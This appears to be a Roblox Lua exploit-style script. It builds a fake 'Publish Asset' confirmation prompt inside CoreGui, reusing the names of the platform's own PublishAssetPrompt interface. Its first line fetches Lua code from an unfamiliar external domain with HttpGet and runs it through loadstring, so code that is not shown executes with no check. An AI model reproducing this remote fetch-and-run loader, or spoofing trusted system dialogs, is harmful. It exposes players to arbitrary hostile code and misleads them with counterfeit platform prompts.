loadstring(game:HttpGet("https://www.byteforge-getnow.space/env/Drawing.lua"))() 
local CoreGui = game:GetService("CoreGui")

local function createInstance(className, name, parent, props)
    local obj = Instance.new(className)
    obj.Name = name
    for k, v in pairs(props or {}) do
        obj[k] = v
    end
    obj.Parent = parent
    return obj
end

local promptFolder = CoreGui:FindFirstChild("PublishAssetPrompt") or createInstance("Folder", "PublishAssetPrompt", CoreGui)

local appFolder = promptFolder:FindFirstChild("PublishAssetPromptApp") or createInstance("Folder", "PublishAssetPromptApp", promptFolder)

local promptFrame = appFolder:FindFirstChild("PromptFrame") or createInstance("Frame", "PromptFrame", appFolder, {
    AutoLocalize = false,
    Size = UDim2.new(0, 300, 0, 200),
    BackgroundColor3 = Color3.fromRGB(50, 50, 50)
})

local focusWrapper = promptFrame:FindFirstChild("FocusNavigationCoreScriptsWrapper") or createInstance("Frame", "FocusNavigationCoreScriptsWrapper", promptFrame, {
    AutoLocalize = false,
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundTransparency = 1
})

local innerFrame = createInstance("Frame", "InnerFrame", focusWrapper, {
    Size = UDim2.new(1, -20, 1, -20),
    Position = UDim2.new(0, 10, 0, 10),
    BackgroundTransparency = 1
})

createInstance("TextLabel", "Title", innerFrame, {
    Text = "Publish Asset",
    Size = UDim2.new(1, 0, 0, 30),
    BackgroundTransparency = 1,
    TextColor3 = Color3.new(1, 1, 1)
})

createInstance("TextLabel", "Description", innerFrame, {
    Text = "Are you sure you want to publish?",
    Size = UDim2.new(1, 0, 0, 30),
    Position = UDim2.new(0, 0, 0, 40),
    BackgroundTransparency = 1,
    TextColor3 = Color3.new(1, 1, 1)
})

local buttonsFrame = createInstance("Frame", "Buttons", innerFrame, {
    Size = UDim2.new(1, 0, 0, 40),
    Position = UDim2.new(0, 0, 0, 80),
    BackgroundTransparency = 1
})

createInstance("TextButton", "ConfirmButton", buttonsFrame, {
    Text = "Confirm",
    Size = UDim2.new(0.5, -5, 1, 0),
    BackgroundColor3 = Color3.fromRGB(0, 170, 0),
    TextColor3 = Color3.new(1, 1, 1)
})

createInstance("TextButton", "CancelButton", buttonsFrame, {
    Text = "Cancel",
    Position = UDim2.new(0.5, 5, 0, 0),
    Size = UDim2.new(0.5, -5, 1, 0),
    BackgroundColor3 = Color3.fromRGB(170, 0, 0),
    TextColor3 = Color3.new(1, 1, 1)
})
